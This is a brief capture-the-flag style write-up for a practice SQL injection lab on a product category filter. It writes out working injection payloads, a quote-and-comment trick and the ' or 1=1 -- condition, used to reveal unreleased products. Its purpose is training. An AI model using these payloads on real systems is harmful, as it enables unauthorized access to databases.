# Sql Injection :- Product category filter

# SELECT * FROM products WHERE category = 'Gifts' AND released = 1

# End Goal:- Display all the products released as well as un-released

# Analysis:-->

SELECT * FROM products WHERE category = 'Pets' AND released = 1
# Here we will get Internal Server error which means it i sql vulnerable if we insert ' after category.

SELECT * FROM products WHERE category = ''--' AND released = 1
# This wont generate any error and '-- will ignore the query.
SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
# This will show all the category becqause here 1=1 will be always true.

# CONGRATULATIONS YOU SOLVED THE LAB
